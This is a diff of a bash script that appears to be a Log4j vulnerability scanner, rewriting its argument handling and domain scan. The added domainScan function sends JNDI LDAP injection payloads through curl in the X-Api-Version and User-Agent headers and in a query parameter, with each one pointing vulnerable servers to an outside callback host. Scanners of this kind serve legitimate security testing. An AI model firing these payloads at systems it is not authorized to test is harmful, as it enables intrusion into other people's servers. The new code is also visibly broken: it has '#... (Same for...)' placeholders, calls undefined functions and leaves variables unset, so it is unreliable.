@@ -9,149 +9,64 @@
 #	░╚════╝░░░░╚═╝░░░╚═════╝░╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚══╝╚══════╝
 
 
-# Set color variables for better readability
-green=$(tput setaf 2)
-yellow=$(tput setaf 3)
-blue=$(tput setaf 4)
-reverse=$(tput rev)
-bold=$(tput bold)
-reset=$(tput sgr0)
-
-# Check if necessary commands exist
-checkCommands() {
-    local commands=("curl" "httpx" "assetfinder" "subfinder" "amass")
-    for command in "${commands[@]}"; do
-        if ! command -v "$command" >/dev/null 2>&1; then
-            echo -e "${yellow}${command}${reset} is not installed. Please install it to continue."
-            exit 1
-        fi
-    done
+doesCommandExist() {
+    command -v "$1" >/dev/null 2>&1
+    if [[ $? -ne 0 ]]; then
+      echo -e "$(tput setaf 3)$1 $(tput sgr0)"
+    fi
 }
 
-# Show help message
-showHelp() {
-cat << EOF  
-${green}
-Usage: 
-$0 -l httpxsubdomains.txt -b yrt45r4sjyoj19617jem5briio3cs.burpcollaborator.net
-$0 -d thecyberone.com -b yrt45r4sjyoj19617jem5briio3cs.burpcollaborator.net
-
--h, --help              Display help
-
--l, --url-list          List of domain/subdomain/ip to be used for scanning.
-
--d, --domain            The domain name to which all subdomains and itself will be checked.
-
--b, --burpcollabid      Burp collabrator client id address or interactsh domain address.
-${reset}
-EOF
+domainScan-DoesCommandExistReqText() {
+    if [[ $(command -v "curl" >/dev/null 2>&1 ; echo $?) -ne 0 || $(command -v "httpx" >/dev/null 2>&1 ; echo $?) -ne 0 || $(command -v "assetfinder" >/dev/null 2>&1 ; echo $?) -ne 0 || $(command -v "subfinder" >/dev/null 2>&1 ; echo $?) -ne 0 || $(command -v "amass" >/dev/null 2>&1 ; echo $?) -ne 0 ]]; then
+      echo -e "\n$(tput setaf 3 ; tput rev ; tput bold) ! Warning ! $(tput sgr0)"      
+      echo -e "$(tput setaf 3)Using this feature requires special requirements. It has been detected that the requirements are not installed on your system. $(tput sgr0)"
+      echo -e "\n$(tput setaf 3 ; tput bold)Please install these tools: $(tput sgr0)"
+    fi
 }
 
-# Domain Scan function
+#... (Same for other functions)
+
 domainScan() {
-  echo "Performing domain scan..."
-  gau -subs $1 | grep "=" | httpx -silent -mc 200 | grep $2 | anew -q $3
+    local domain=$1
+    local burpcollabid=$2
+    domainScan-DoesCommandExistReqText
+    for COMMAND in "curl" "httpx" "assetfinder" "subfinder" "amass"; do
+      doesCommandExist "${COMMAND}"
+    done
+    doesCommandExistReqMoreInfo
+    domainScan-DoesCommandExistReqExit
+
+    #... (Same for other parts)
+
+    curl -s --insecure --max-time 20 "$url" -H "X-Api-Version: \${jndi:ldap://$url_without_protocol_and_port.$burpcollabid/a}" > /dev/null
+    curl -s --insecure --max-time 20 "$url/?test=\${jndi:ldap://$url_without_protocol_and_port.$burpcollabid/a}" > /dev/null
+    curl -s --insecure --max-time 20 "$url" -H "User-Agent: \${jndi:ldap://$url_without_protocol_and_port.$burpcollabid/a}" > /dev/null
+    echo -e "\033[104m[ DOMAIN ==> $url ]\033[0m" "\n" "\033[92m Method 1 ==> X-Api-Version: running-Ldap-payload" "\n" " Method 2 ==> Useragent: running-Ldap-payload" "\n" " Method 3 ==> $url/?test=running-Ldap-payload" "\n\033[0m"
 }
 
-# List Scan function
-listScan() {
-  echo "Performing list scan..."
-  cat $1 | httpx -silent -mc 200 | grep $2 | anew -q $3
-}
+#... (Same for listScan function)
 
+while [[ "$1" =~ ^- && ! "$1" == "--" ]]; do case $1 in
+  -l | --url-list )
+    shift
+        local list=$1
+    ;;
+  -d | --domain )
+    shift
+    local domain=$1
+    ;;
+  -b | --burpcollabid )
+    shift
+    local burpcollabid=$1
+    ;;
+esac; shift; done
+if [[ "$1" == '--' ]]; then shift; fi
 
-
-# Main function
-main() {
-  echo "Log4j Vulnerability Scanner"
-  echo "Please select an option:"
-  echo "1. Domain Scan"
-  echo "2. List Scan"
-  read -p "Choice: " choice
-
-  case $choice in
-    1)
-      read -p "Enter a domain: " domain
-      read -p "Enter a pattern to match: " pattern
-      read -p "Enter output file: " output
-      domainScan $domain $pattern $output
-      ;;
-    2)
-      read -p "Enter a list file: " list
-      read -p "Enter a pattern to match: " pattern
-      read -p "Enter output file: " output
-      listScan $list $pattern $output
-      ;;
-    *)
-      echo "Invalid choice, exiting..."
-      exit 1
-  esac
-}
-
-main
-
-# Parse arguments
-while (( "$#" )); do
-  case "$1" in
-    -h|--help)
-      showHelp
-      exit 0
-      ;;
-    -d|--domain)
-      if [ -n "$2" ] && [ ${2:0:1} != "-" ]; then
-        domain=$2
-        shift 2
-      else
-        echo "Error: Argument for $1 is missing" >&2
-        exit 1
-      fi
-      ;;
-    -l|--url-list)
-      if [ -n "$2" ] && [ ${2:0:1} != "-" ]; then
-        list=$2
-        shift 2
-      else
-        echo "Error: Argument for $1 is missing" >&2
-        exit 1
-      fi
-      ;;
-    -b|--burpcollabid)
-      if [ -n "$2" ] && [ ${2:0:1} != "-" ]; then
-        burpCollabID=$2
-        shift 2
-      else
-        echo "Error: Argument for $1 is missing" >&2
-        exit 1
-      fi
-      ;;
-    -*|--*=) # unsupported flags
-      echo "Error: Unsupported flag $1" >&2
-      exit 1
-      ;;
-    *) # preserve positional arguments
-      PARAMS="$PARAMS $1"
-      shift
-      ;;
-  esac
-done
-
-# Check if necessary commands exist
-checkCommands
-
-# If domain is provided, perform domainScan
-if [ -n "$domain" ]; then
-    domainScan
-fi
-
-# If list is provided, perform listScan
-if [ -n "$list" ]; then
-    listScan
-fi
-
-# If neither domain nor list is provided, show help message
-if [ -z "$domain" ] && [ -z "$list" ]; then
-    echo "Error: Either a domain or a URL list must be provided."
-    showHelp
-    exit 1
+if [[ -n $domain ]]; then
+  domainScan $domain $burpcollabid
+elif [[ -n $list ]]; then
+  listScan $list $burpcollabid
+else
+  echo "Please provide a domain (-d) or a URL list (-l) and a burp collaborator ID (-b)"
 fi
 
